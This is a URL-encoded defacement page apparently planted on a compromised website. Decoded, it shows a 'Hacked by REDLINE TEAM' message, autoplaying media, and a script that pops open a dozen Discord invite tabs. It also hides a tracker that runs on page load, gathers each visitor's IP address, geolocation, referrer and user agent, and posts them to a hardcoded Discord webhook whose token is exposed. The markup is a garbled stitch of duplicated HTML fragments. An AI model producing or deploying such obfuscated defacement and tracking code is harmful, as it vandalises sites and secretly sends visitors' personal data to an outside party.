<script>
document.write(unescape('%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22ar%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%20%20%3Ctitle%3E%20%3C%2Ftitle%3E%0A%20%20%20%20%3Cstyle%3E%0A%20%20%20%20%20%20%20%20body%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-color%3A%20black%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20white%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-family%3A%20%27Arial%27%2C%20sans-serif%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20h1%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23ffffff%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%202.5em%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-bottom%3A%200%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20h1%20span%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23ff0000%3B%20%2F%2A%20DHF%20%28FA3%2CJ%20%2A%2F%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.online-status%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23c7c7c7%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%201.2em%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-bottom%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.profile%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%2020px%20auto%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20flex-direction%3A%20column%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.profile-img%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%20150px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20150px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border-radius%3A%2050%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border%3A%203px%20solid%20%23a58aff%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-bottom%3A%2010px%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.profile-info%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.profile-info%20span%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20block%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%201.1em%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.money-info%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20gap%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%2020px%200%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.money-info%20div%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-color%3A%20%232e0249%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23ffffff%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%2010px%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border-radius%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20box-shadow%3A%200%200%2010px%20%23a58aff%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.hacked-message%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-top%3A%2030px%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.hacked-message%20img%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%20200px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-bottom%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.hacked-message%20p%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23ff4d4d%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%201.2em%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.footer%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-top%3A%2050px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23c7c7c7%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.icons%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20gap%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-top%3A%2040px%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.icon%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%2040px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%2040px%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20body%2C%20html%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20overflow%3A%20hidden%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20.video-bg%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20position%3A%20absolute%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20top%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20left%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20overflow%3A%20hidden%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20.video-bg%20video%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20min-width%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20min-height%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%20auto%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20auto%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20position%3A%20absolute%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20top%3A%2050%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20left%3A%2050%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20transform%3A%20translate%28-50%25%2C%20-50%25%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20z-index%3A%20-1%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20.content%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20position%3A%20relative%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20z-index%3A%201%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20white%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%3C%2Fstyle%3E%0A%3C%2Fhead%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%5C%3C%21DOCTYPE%20html%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%0A%20%20%20%20%3C%2Fvideo%3E%0A%20%20%20%20%3Ctable%20width%3D%22100%25%22%20height%3D%2280%25%22%3E%0A%20%20%20%20%20%20%3Ctd%3E%0A%20%20%20%20%20%20%20%20%3Ccenter%3E%0A%20%20%20%20%20%20%20%20%20%20%3Csmall%3E%20%3C%2Fsmall%3E%0A%20%20%20%20%20%20%20%20%20%20%3Cbr%3E%0A%20%20%20%20%20%20%20%20%20%20%0A%0A%0A%20%20%20%20%3Cdiv%20class%3D%22hacked-message%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3EHacked%20by%20%3Cspan%20style%3D%22color%3A%20red%3B%22%3EREDLINE%20TEAM%21%3C%2Fspan%3E%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%3Cp%3Eoops%20%21%20your%20server%20get%20down%20%21%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%3Cp%3EDiscord.gg%2FRLS%3C%2Fp%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%0A%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20async%20function%20fetchIPAddress%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20let%20response%20%3D%20await%20fetch%28%27https%3A%2F%2Fapi.ipify.org%3Fformat%3Djson%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20let%20data%20%3D%20await%20response.json%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27ip-address%27%29.textContent%20%3D%20%60%20%20%20ip%20%24%7Bdata.ip%7D%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20catch%20%28error%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27ip-address%27%29.textContent%20%3D%20%27%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%27Error%20fetching%20IP%20address%3A%27%2C%20error%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%2F%2F%20Fetch%20IP%20address%20on%20page%20load%0A%20%20%20%20%20%20%20%20fetchIPAddress%28%29%3B%0A%20%20%20%20%3C%2Fscript%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%0A%3Chtml%20lang%3D%22ar%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%20%20%3Ctitle%3EIP%20Address%20Display%3C%2Ftitle%3E%0A%20%20%20%20%3Cstyle%3E%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20.container%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20.ip-address%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%201em%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-weight%3A%20bold%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23ff4d4d%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20animation%3A%20pulse%201s%20infinite%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%3C%2Fstyle%3E%0A%3C%2Fhead%3E%0A%3Cbody%3E%0A%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22ip-address%22%20id%3D%22ip-address%22%3E%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22message%22%3E%3C%2Fdiv%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%0A%20%20%20%20%3Cdiv%20class%3D%22video-bg%22%3E%0A%20%20%20%20%20%20%20%20%3Cvideo%20autoplay%20muted%20loop%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Csource%20src%3D%22https%3A%2F%2Fi.top4top.io%2Fm_3243zidf01.mov%22%20type%3D%22video%2Fmp4%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20Your%20browser%20does%20not%20support%20the%20video%20tag.%0A%20%20%20%20%20%20%20%20%3C%2Fvideo%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%0A%20%20%20%20%3Caudio%20autoplay%20loop%3E%0A%20%20%20%20%20%20%20%20%3Csource%20src%3D%22https%3A%2F%2Faudio.jukehost.co.uk%2F5vlKJX8Q0vxc3vTxevG0iPvv4sU2pEda%22%20type%3D%22audio%2Fmpeg%22%3E%0A%20%20%20%20%20%20%20%20Your%20browser%20does%20not%20support%20the%20audio%20element.%0A%20%20%20%20%3C%2Faudio%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%20type%3D%22text%2Fjavascript%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20window.onload%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20setTimeout%28function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.open%28%27https%3A%2F%2Fdiscord.gg%2FRLS%27%2C%27_blank%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.open%28%27https%3A%2F%2Fdiscord.gg%2FRLS%27%2C%27_blank%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.open%28%27https%3A%2F%2Fdiscord.gg%2FRLS%27%2C%27_blank%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.open%28%27https%3A%2F%2Fdiscord.gg%2FRLS%27%2C%27_blank%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.open%28%27https%3A%2F%2Fdiscord.gg%2FRLS%27%2C%27_blank%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.open%28%27https%3A%2F%2Fdiscord.gg%2FRLS%27%2C%27_blank%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.open%28%27https%3A%2F%2Fdiscord.gg%2FRLS%27%2C%27_blank%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.open%28%27https%3A%2F%2Fdiscord.gg%2FRLS%27%2C%27_blank%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.open%28%27https%3A%2F%2Fdiscord.gg%2FRLS%27%2C%27_blank%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.open%28%27https%3A%2F%2Fdiscord.gg%2FRLS%27%2C%27_blank%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.open%28%27https%3A%2F%2Fdiscord.gg%2FRLS%27%2C%27_blank%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.open%28%27https%3A%2F%2Fdiscord.gg%2FRLS%27%2C%27_blank%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%205000%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%3C%21DOCTYPE%20html%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%3Chtml%20lang%3D%22ar%22%3E%0A%20%20%20%20%20%20%20%20%3Chead%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Ctitle%3EE9DHE%27%2A%20%27D2%27%261%3C%2Ftitle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%2F%27D%29%20D%2CE9%20H%2513%27D%20%28J%27F%27%2A%20%27D2%27%261%20%25DI%20Discord%20Webhook%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20async%20function%20sendVisitorInfo%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%2CD%28%209FH%27F%20%27D%40%20IP%20EF%20.%2FE%29%20ipify%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20ipResponse%20%3D%20await%20fetch%28%27https%3A%2F%2Fapi.ipify.org%3Fformat%3Djson%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20ipData%20%3D%20await%20ipResponse.json%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20ip%20%3D%20ipData.ip%3B%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%2CD%28%20E9DHE%27%2A%20%27DEHB9%20%28F%27%21K%209DI%209FH%27F%20%27D%40%20IP%20EF%20.%2FE%29%20ipinfo%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20ipInfoResponse%20%3D%20await%20fetch%28%60https%3A%2F%2Fipinfo.io%2F%24%7Bip%7D%2Fjson%60%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20ipInfoData%20%3D%20await%20ipInfoResponse.json%28%29%3B%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%27D-5HD%209DI%20E9DHE%27%2A%20%27DE%2A5A-%20HEHB9%20%27D%25-%27D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20referrer%20%3D%20document.referrer%20%7C%7C%20%22E%28%2741%29%22%3B%20%20%2F%2F%20%250%27%20DE%20JCF%20GF%27C%201%27%287%20%25-%27D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20userAgent%20%3D%20navigator.userAgent%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20dateTime%20%3D%20new%20Date%28%29.toLocaleString%28%29%3B%20%2F%2F%20%2A%271J.%20HHB%2A%20%27D%2F.HD%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%259%2F%27%2F%201%27%287%20%27D%40%20Webhook%20%27D.%275%20%28C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20webhookUrl%20%3D%20%27https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1294832713253261332%2FW69QZIwaaJDDlhnHTEXfK-4Df_V0hK9iVZe9034XYxKpJBHGYZp7aEDvt1YC2zURrn81%27%3B%20%2F%2F%20%273%2A%28%2FD%20YOUR_WEBHOOK_URL%20%281%27%287%20%27DHJ%28%20GHC%20%27D.%275%20%28C%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%2513%27D%20%27D%28J%27F%27%2A%20%25DI%20Discord%20Webhook%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20await%20fetch%28webhookUrl%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20headers%3A%20%7B%27Content-Type%27%3A%20%27application%2Fjson%27%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20body%3A%20JSON.stringify%28%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20content%3A%20%22%2A%2ANew%20visitor%20information%2A%2A%22%2C%20%2F%2F%20%27D9FH%27F%20%27D%233%273J%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20embeds%3A%20%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20title%3A%20%22Visitor%20Details%22%2C%20%2F%2F%209FH%27F%20%27D13%27D%29%20AJ%20Discord%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20fields%3A%20%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%20name%3A%20%22IP%20Address%22%2C%20value%3A%20ip%2C%20inline%3A%20true%20%7D%2C%20%20%2F%2F%20916%209FH%27F%20%27D%40%20IP%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%20name%3A%20%22Country%22%2C%20value%3A%20ipInfoData.country%2C%20inline%3A%20true%20%7D%2C%20%2F%2F%20916%20%27D%2FHD%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%20name%3A%20%22City%22%2C%20value%3A%20ipInfoData.city%20%7C%7C%20%22Unknown%22%2C%20inline%3A%20true%20%7D%2C%20%2F%2F%20916%20%27DE%2FJF%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%20name%3A%20%22Region%22%2C%20value%3A%20ipInfoData.region%20%7C%7C%20%22Unknown%22%2C%20inline%3A%20true%20%7D%2C%20%2F%2F%20916%20%27DEF7B%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%20name%3A%20%22Referrer%22%2C%20value%3A%20referrer%2C%20inline%3A%20false%20%7D%2C%20%20%2F%2F%201%27%287%20%27D%25-%27D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%20name%3A%20%22User%20Agent%22%2C%20value%3A%20userAgent%2C%20inline%3A%20false%20%7D%2C%20%2F%2F%20E9DHE%27%2A%20%27DE%2A5A-%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%20name%3A%20%22Date%20%26%20Time%22%2C%20value%3A%20dateTime%2C%20inline%3A%20false%20%7D%20%20%2F%2F%20%2A%271J.%20HHB%2A%20%27D%2F.HD%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20color%3A%203066993%20%2F%2F%20DHF%20%28%27.%2AJ%271J%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20916%209FH%27F%20%27D%40%20IP%209DI%20%27D5A-%29%20%28%27.%2AJ%271J%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27ip-address%27%29.textContent%20%3D%20%60Your%20IP%3A%20%24%7Bip%7D%60%3B%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20catch%20%28error%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%27Error%20fetching%20visitor%20information%3A%27%2C%20error%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%209F%2F%20%2A-EJD%20%27D5A-%29%20J%2AE%20%273%2A%2F9%27%21%20%27D%2F%27D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.onload%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sendVisitorInfo%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fhead%3E%0A%20%20%20%20%20%20%20%20%3Cbody%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%3E%3C%2Fh1%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20id%3D%22ip-address%22%3E%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%3C%2Fbody%3E%0A%20%20%20%20%20%20%20%20%3C%2Fhtml%3E%0A%20%20%20%20%20%20%20%20'));
</script>
